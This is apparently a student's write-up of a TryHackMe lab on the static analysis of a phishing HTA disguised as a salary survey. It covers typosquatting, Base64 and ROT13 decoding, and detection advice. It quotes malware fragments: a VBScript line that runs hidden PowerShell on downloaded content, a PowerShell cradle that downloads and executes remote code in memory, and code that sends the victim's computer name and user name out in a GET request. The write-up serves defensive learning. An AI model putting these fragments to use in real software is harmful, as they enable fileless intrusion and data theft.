# Day 21: HTA Malware Analysis - Malhare.exe

## üìã Quick Facts
- **Date Completed:** December 21, 2025
- **Time Spent:** 2 hours
- **Difficulty:** ‚òÖ‚òÖ‚òÖ‚òÖ (Hard)
- **Category:** Malware Analysis / Static Analysis / Living off the Land
- **Room URL:** https://tryhackme.com/room/htapowershell-aoc2025-p2l5k8j1h4

---

## üéØ Challenge Overview

This challenge introduced HTA (HTML Application) malware analysis through investigating a malicious salary survey that compromised multiple TBFC employees' laptops. I learned how attackers weaponize legitimate Windows features by combining HTML, VBScript, and PowerShell to create stealthy malware. The investigation involved static analysis of a phishing HTA file disguised as an HR survey, uncovering typosquatting domains, data exfiltration mechanisms, multi-layer encoding (Base64 + ROT13), and PowerShell execution chains that download and execute second-stage payloads.

**Learning Objectives:**
- Understand what HTA files are and why attackers abuse them
- Learn the "Living off the Land" (LotL) attack technique
- Perform static malware analysis on HTA files using text editors
- Decode multi-layer obfuscation (Base64, ROT13)
- Trace VBScript execution flow and identify malicious functions
- Recognize typosquatting and data exfiltration patterns

---

## üí° What I Learned

### What are HTA Files?

**HTA (HTML Application)** is a Microsoft Windows program whose source code consists of HTML, CSS, and one or more scripting languages (VBScript or JScript).

**Key Characteristics:**
- File extension: `.hta`
- Executed by `mshta.exe` (built-in Windows component)
- Runs **outside the browser sandbox** with full system access
- Can interact with Windows APIs, file system, registry, network

**Legitimate Uses:**
- System administrators use HTAs for automation and quick GUI tools
- Internal corporate applications
- Simple desktop utilities that need a web-like interface

**Why Attackers Love HTAs:**
1. **Full system access** - Not sandboxed like web pages
2. **Built-in execution** - No need to drop external binaries
3. **"Living off the Land"** - Uses Windows-native tools
4. **Bypasses detection** - Looks like HTML, executes like malware
5. **Social engineering** - Can be disguised as documents, forms, surveys

**Critical Difference:**
- Normal HTML in browser: Sandboxed, limited permissions
- HTA file: Full access to Windows APIs, file system, PowerShell

### Living off the Land (LotL) Attacks

**Definition:** Attackers use legitimate, pre-installed system tools instead of custom malware to avoid detection.

**Common LotL Tools Abused:**
- `mshta.exe` - Executes HTA files
- `powershell.exe` - Runs scripts, downloads files
- `wscript.exe` / `cscript.exe` - Windows Script Host
- `rundll32.exe` - Executes DLL functions
- `certutil.exe` - Download files (originally for certificate management)

**Why LotL Works:**
- These tools are **expected** on Windows systems
- Antivirus often whitelists them (false positive avoidance)
- Harder to detect because there's no "malware.exe" file
- Blends into normal system activity

**Security Impact:** Defenders must monitor **how** legitimate tools are used, not just **what** files exist.

### Anatomy of a Malicious HTA

**Structure of the Malicious Survey HTA:**

```html
<html>
<head>
    <title>Best Festival Company Developer Survey</title>
    <HTA:APPLICATION 
        ID="TBFCSurvey"
        APPLICATIONNAME="TBFC Survey"
        BORDER="thin"
        SHOWINTASKBAR="yes"
        WINDOWSTATE="normal">
    </HTA:APPLICATION>
</head>
<body>
    <script language="VBScript">
        ' Malicious code hidden here
    </script>
    <!-- Legitimate-looking survey form -->
</body>
</html>
```

**What I Learned from the HTA Metadata:**

**1. Application Title Analysis:**
- Title: "Best Festival Company Developer Survey"
- **Social Engineering:** Looks like legitimate internal HR tool
- Attackers craft realistic titles to build trust

**2. HTA:APPLICATION Configuration:**
- `SHOWINTASKBAR="yes"` - Makes it look like a normal application
- `WINDOWSTATE="normal"` - Opens in regular window, not minimized/hidden
- **Deception:** Appears legitimate while malicious code runs in background

### Typosquatting Domain Discovery

**What is Typosquatting?**
Registering domains that look similar to legitimate ones to trick users.

**Example from the Challenge:**
- **Legitimate domain:** `bestfestivalcompany.com`
- **Malicious domain:** `bestfestiivalcompany.com` ‚Üê Extra "i"
- **Typosquatting character:** The double "i" in "festiival"

**Why This Works:**
- Humans read quickly and don't notice small differences
- At a glance, `festiival` looks like `festival`
- Logs may not be monitored for subtle typos

**URL Discovery in HTA Code:**
```vbscript
Dim surveyURL
surveyURL = "https://survey.bestfestiivalcompany.com/questions"
```

**How to Spot Typosquatting:**
- Compare with known legitimate domains
- Look for repeated letters (double vowels/consonants)
- Check character substitutions (0 for O, 1 for l, rn for m)
- Use domain reputation tools

### VBScript Functions and Execution Flow

I analyzed the HTA's VBScript to understand the attack chain:

**Key Functions Identified:**

**1. Auto-Execution Function:**
```vbscript
window_onload
```
- Runs automatically when HTA opens
- User doesn't need to click anything
- Starts malicious process immediately

**2. getQuestions() - Downloader Function:**
```vbscript
Function getQuestions()
    ' Downloads "survey questions" from malicious domain
    ' Actually fetches next-stage payload
End Function
```

**What it really does:**
- Pretends to fetch survey questions
- Actually downloads malicious PowerShell script
- Makes the HTA look benign (just loading a form)

**3. provideFeedback() - Execution Function:**
```vbscript
Function provideFeedback(feedbackString)
    Dim runObject
    Set runObject = CreateObject("WScript.Shell")
    runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
End Function
```

**Critical Line of Code:**
```vbscript
runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
```

**PowerShell Flags Explained:**
- `-nop` (NoProfile) - Don't load PowerShell profile (faster, stealthier)
- `-w hidden` (WindowStyle Hidden) - No visible window
- `-c` (Command) - Execute the following command

**What this does:**
- Takes downloaded content (`feedbackString`)
- Passes it directly to PowerShell
- Executes silently in background
- User sees survey, malware runs invisibly

### Data Exfiltration Mechanism

**Information Being Stolen:**
The HTA enumerates and exfiltrates:
1. **ComputerName** - Identifies the compromised system
2. **UserName** - Identifies the victim user account

**How Data is Collected (VBScript):**
```vbscript
Dim wshNetwork
Set wshNetwork = CreateObject("WScript.Network")
Dim computerName, userName
computerName = wshNetwork.ComputerName
userName = wshNetwork.UserName
```

**Exfiltration Method:**
- **HTTP Method:** GET request
- **Endpoint:** `/details`
- **Full URL:** `https://survey.bestfestiivalcompany.com/details?computer=[NAME]&user=[USER]`

**Why This Matters:**
- Attackers build inventory of compromised systems
- Username helps with targeted follow-up attacks
- Computer name aids in identifying high-value targets

### Social Engineering in Code

**The Survey Deception:**
- HTA contains **4 actual survey questions** about salary and workplace satisfaction
- Questions are functional and display to the user
- Creates believability and distracts from background activity

**Incentive for Participation:**
- Survey promises chance to win **a trip to Hawaii**
- Classic social engineering: Fake reward to encourage interaction
- Even in malicious code, psychological manipulation persists

**Dual-Purpose Design:**
- **Frontend:** Legitimate-looking survey interface
- **Backend:** Malicious data exfiltration and payload execution
- User believes they're just filling out HR survey while malware runs

### Multi-Layer Encoding Analysis (Second-Stage Payload)

After the HTA downloads the next-stage payload, it's heavily obfuscated:

**Layer 1: Base64 Encoding**
```
Encrypted payload looked like:
UG9aeXJTaGVzY3JpcHQ6...
```

**What Base64 does:**
- Converts binary/text to ASCII-safe characters
- Hides intent from basic antivirus string matching
- Not encryption, just encoding (easily reversible)

**Layer 2: ROT13 Cipher**
After decoding Base64, the result was still unreadable because it used ROT13.

**What is ROT13?**
- Simple substitution cipher
- Rotates each letter 13 positions in alphabet
- A‚ÜíN, B‚ÜíO, C‚ÜíP, ... M‚ÜíZ, N‚ÜíA, ... Z‚ÜíM

**Example:**
- Original: `Hello World`
- ROT13: `Uryyb Jbeyq`

**PowerShell ROT13 Implementation (AABB Function):**
The malware included a PowerShell function called `AABB` that implements ROT13 decoding. This is a common pattern where attackers include decryption routines directly in the payload to decode the final stage.

**Decoding Process:**
1. Copy Base64 blob from payload
2. Use CyberChef: "From Base64"
3. Apply "ROT13" to decoded output
4. Readable PowerShell script revealed

**Why Multi-Layer Encoding?**
- Each layer defeats different detection methods
- Base64 bypasses basic string scanning
- ROT13 adds another obfuscation level
- Forces analysts to work harder (many give up)

**Real-World Context:**
In Summer 2025, ransomware groups deployed **Epsilon Red ransomware** using HTA files disguised as fake verification pages. This demonstrates that HTA-based attacks are not theoretical‚Äîthey're active threats used in real campaigns targeting organizations worldwide.

### PowerShell Variable Chain ($U, $C, $B)

After decoding, the PowerShell script revealed a common attack pattern:

```powershell
$U = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("..."))
$C = (New-Object Net.WebClient).DownloadString($U)
$B = [ScriptBlock]::Create($C)
Invoke-Command -ScriptBlock $B
```

**Variable Analysis:**

**$U (URL Variable):**
- Holds the decoded URL
- Points to attacker's C2 server
- Location from which next payload is fetched

**$C (Content Variable):**
- Stores the downloaded content
- Usually a PowerShell script or instructions
- Retrieved from $U URL

**$B (ScriptBlock Variable):**
- Converts downloaded content into executable code
- Uses `[ScriptBlock]::Create()` to prepare execution
- Runs entirely in memory (fileless attack)

**Final Execution:**
```powershell
Invoke-Command -ScriptBlock $B
```
- Executes the downloaded script
- No file written to disk
- Extremely stealthy (bypasses file-based detection)

**Key Indicator of Malicious Activity:**
Whenever variables end up inside:
- `Invoke-Command`
- `Invoke-Expression` (IEX)
- `.Run()`
- `Execute()`
- `Eval()`

This signals that downloaded/decoded data is being executed.

### Static Analysis Methodology

**Three-Step Process for Analyzing Malicious HTAs:**

**Step 1: Locate Script Sections**
```html
<script language="VBScript">
    ' Find these sections first
</script>
```
- Identify where code execution happens
- Separate visual HTML from functional scripts

**Step 2: Identify Key Components**
- **Functions:** `getQuestions()`, `provideFeedback()`, `window_onload()`
- **Encoded strings:** Base64 blobs, suspicious long strings
- **URLs:** External connections (typosquatting domains)
- **System calls:** `WScript.Shell`, `CreateObject()`, PowerShell execution

**Step 3: Decode and Trace**
- Decode any hidden information (Base64, ROT13)
- Follow variable flow: Where is data created ‚Üí used ‚Üí executed?
- Map the attack chain: Download ‚Üí Decode ‚Üí Execute

**Critical Safety Rule:**
**NEVER execute suspicious files to "see what they do"**
- Use text editors (`pluma`, `notepad++`, `vim`) to read code
- Analyze statically before considering dynamic analysis
- If dynamic analysis needed, use isolated sandbox

---

## üõ†Ô∏è Tools & Techniques Used

### Tools
1. **Pluma Text Editor** - Static analysis of HTA file (reading VBScript/HTML)
2. **CyberChef** - Multi-layer decoding (Base64 ‚Üí ROT13)
3. **AttackBox Terminal** - File navigation and examination
4. **Domain Analysis** - Identifying typosquatting patterns
5. **Any.run** (mentioned) - Sandbox analysis platform for dynamic malware analysis
6. **VirusTotal** (mentioned) - Multi-AV scanning and threat intelligence
7. **PowerShell Event Logs** - Detection via Event ID 4104 (Script Block Logging)
8. **AppLocker** - Application whitelisting to block mshta.exe execution

### Techniques
- **Static malware analysis** - Examining code without execution
- **VBScript code review** - Tracing function flow and logic
- **Multi-layer decoding** - Base64 and ROT13 decryption
- **PowerShell variable tracking** - Following $U ‚Üí $C ‚Üí $B chain
- **Typosquatting detection** - Comparing legitimate vs. malicious domains
- **Data exfiltration analysis** - Identifying stolen information and transmission methods
- **Social engineering analysis** - Understanding attacker psychology and deception
- **LotL technique recognition** - Identifying abuse of legitimate Windows tools

---

## ü§î Challenges I Faced

**Everything Was New:** This challenge introduced completely new concepts that I hadn't encountered before. HTA files, VBScript syntax, PowerShell variable chains, multi-layer encoding‚Äîall of it was unfamiliar territory.

**VBScript and Functions:** I'm familiar with HTML from my ILS subject, so the structure of the HTA file made sense visually. However, the **VBScript functions and variables were confusing**:
- Understanding `CreateObject("WScript.Shell")`
- Following function calls (`getQuestions()` ‚Üí `provideFeedback()`)
- Tracing variable flow through execution chain

**PowerShell Variable Chains:** The `$U`, `$C`, `$B` pattern was particularly hard to grasp:
- What is `[System.Text.Encoding]::UTF8.GetString()`?
- How does `[ScriptBlock]::Create()` work?
- Why are variables being executed instead of just stored?

**Multi-Layer Encoding:** Decoding Base64 ‚Üí ROT13 required using CyberChef, which I've used before, but understanding **why** attackers use multiple layers and **how** to systematically decode them took effort.

**Memory Retention:** To be honest, **I don't remember any of this now**. After completing the challenge, I understood the concepts in the moment, but the technical details (VBScript syntax, PowerShell commands, encoding techniques) didn't stick. This is why documentation is so important for me‚ÄîI need a reference to review later.

**Overall Difficulty:** This was genuinely hard (‚òÖ‚òÖ‚òÖ‚òÖ feels accurate). The challenge wasn't just "follow instructions"‚Äîit required understanding how different technologies (HTML, VBScript, PowerShell) interact and how attackers layer obfuscation techniques. The learning curve was steep, but I pushed through.

---

## ‚úÖ How This Helps My Career

HTA malware analysis is **directly relevant to SOC analyst and incident response roles**:

**Why HTA Malware Matters:**
- **Real-world threat:** HTA files are used in actual ransomware campaigns (Epsilon Red ransomware, 2025)
- **60% of SOC analyst jobs** mention malware analysis skills
- **Living off the Land attacks** are increasingly common and harder to detect
- Understanding encoding/obfuscation is essential for reverse engineering

**SOC Analyst Applications (Defensive):**

**Alert Triage:**
- Recognize `mshta.exe` process execution in EDR alerts
- Identify suspicious parent-child relationships: `mshta.exe` ‚Üí `powershell.exe`
- Flag encoded PowerShell commands (Base64 blobs in command line)
- Detect typosquatting domains in proxy/DNS logs

**Incident Investigation:**
- Trace HTA infection chain: Email ‚Üí HTA download ‚Üí PowerShell execution
- Identify exfiltrated data (ComputerName, UserName)
- Determine scope: Which users opened the malicious survey?
- Extract IOCs: Typosquatted domains, C2 URLs, PowerShell payloads

**Threat Hunting:**
- Hunt for `mshta.exe` launching PowerShell with hidden windows (`-w hidden`)
- Search for Base64-encoded PowerShell in process command lines
- Look for GET requests to suspicious domains with `/details` endpoint
- Correlate HTA email attachments with subsequent PowerShell activity

**Malware Analysis:**
- Safely analyze suspicious HTA files using static analysis
- Decode multi-layer obfuscation (Base64, ROT13, XOR)
- Understand LotL techniques to improve detection rules
- Extract final payloads for threat intelligence

**Detection Engineering:**
- Write SIEM rules for `mshta.exe` ‚Üí `powershell.exe` execution chains
- Create alerts for typosquatting domains (string similarity matching)
- Monitor for WScript.Network object usage (system enumeration)
- Flag HTTP GET requests with `ComputerName` and `UserName` parameters

**Career Skills Developed:**
- **VBScript analysis** - Understanding Windows scripting environments
- **PowerShell forensics** - Decoding obfuscated commands
- **Multi-layer decoding** - Base64, ROT13, and other encoding schemes
- **Static malware analysis** - Examining code without execution
- **LotL attack recognition** - Identifying abuse of legitimate tools

**Interview Talking Point:** "I have hands-on experience analyzing HTA malware using static analysis techniques. I can reverse-engineer VBScript and PowerShell execution chains, decode multi-layer obfuscation like Base64 and ROT13, identify typosquatting domains, and trace data exfiltration mechanisms. I understand Living off the Land attack techniques and can create detection rules for mshta.exe abuse, PowerShell fileless execution, and encoded command patterns. This experience directly applies to SOC alert triage, incident investigation, and threat hunting in real-world environments."

---

## üìö Key Takeaways for Future Reference

**HTA Files - The Danger of "Living off the Land":**
- HTAs execute via `mshta.exe` (built-in Windows tool) with **full system access**, not browser sandboxed
- Attackers abuse legitimate Windows features to avoid dropping custom malware binaries
- Detection must focus on **how legitimate tools are used**, not just what files exist

**Critical HTA Analysis Workflow:**
1. **Never execute** - Open only in text editors (Pluma, Notepad++, vim)
2. **Locate script sections** - Find `<script language="VBScript">` blocks
3. **Identify functions** - Map execution flow (auto-run functions, downloaders, executors)
4. **Extract IOCs** - URLs, domains, encoded strings, PowerShell commands
5. **Decode obfuscation** - Base64 ‚Üí ROT13 ‚Üí other ciphers as needed
6. **Trace variables** - Follow data from creation ‚Üí usage ‚Üí execution

**PowerShell Execution Red Flags:**
- `-nop` (NoProfile), `-w hidden` (hidden window), `-ExecutionPolicy Bypass`
- Variables inside `Invoke-Command`, `Invoke-Expression` (IEX), `[ScriptBlock]::Create()`
- Base64-encoded command-line arguments
- Downloading content from URLs and executing directly in memory (fileless)

**Multi-Layer Obfuscation Pattern:**
- **Layer 1:** Base64 encoding (hides from basic string scanning)
- **Layer 2:** ROT13 or XOR cipher (adds complexity)
- **Purpose:** Each layer defeats different detection methods; forces manual analysis

**Typosquatting Detection:**
- Compare domains against known legitimate ones
- Look for: doubled letters (festiival vs festival), character substitutions (0 for O, rn for m)
- Monitor DNS/proxy logs for similar-but-wrong domains

**Detection & Defense:**
- Monitor PowerShell Event ID 4104 (Script Block Logging) for suspicious flags
- Block or restrict `mshta.exe` execution via AppLocker or WDAC
- Flag `.hta`, `.vbs`, `.js` email attachments in email gateways
- Hunt for `mshta.exe` ‚Üí `powershell.exe` parent-child relationships in EDR
- Search for WScript.Network object usage (system enumeration indicator)

**Real-World Impact:**
- **Epsilon Red ransomware (Summer 2025)** used HTA files disguised as verification pages
- HTAs remain active threat vector in phishing campaigns
- Combination of social engineering + technical obfuscation makes them effective

---

## üîó Security+ Connection

**Domain 2.0 - Threats, Vulnerabilities & Mitigations (22%):** Malware types, fileless malware, Living off the Land attacks, obfuscation techniques, social engineering, typosquatting, data exfiltration.

**Domain 4.0 - Security Operations (28%):** Malware analysis, static analysis methodologies, incident investigation, threat hunting, indicators of compromise (IOCs), SIEM detection rules, forensic analysis.

---

## üì∏ Evidence

![HTA Static Analysis - Typosquatting Domain](../07-Screenshots/day-21/hta-typosquatting-domain.png)
*Analyzed survey.hta in Pluma text editor, discovered typosquatted domain "bestfestiivalcompany.com" with extra "i" character*

![VBScript Function Analysis - Data Exfiltration](../07-Screenshots/day-21/vbscript-exfiltration.png)
*Identified VBScript code exfiltrating ComputerName and UserName via GET request to /details endpoint*

![PowerShell Execution Chain](../07-Screenshots/day-21/powershell-execution-line.png)
*Located critical line of code executing downloaded payload: runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString*

![Multi-Layer Decoding - CyberChef](../07-Screenshots/day-21/cyberchef-base64-rot13.png)
*Used CyberChef to decode second-stage payload: From Base64 ‚Üí ROT13 ‚Üí readable PowerShell script revealing final flag*

---
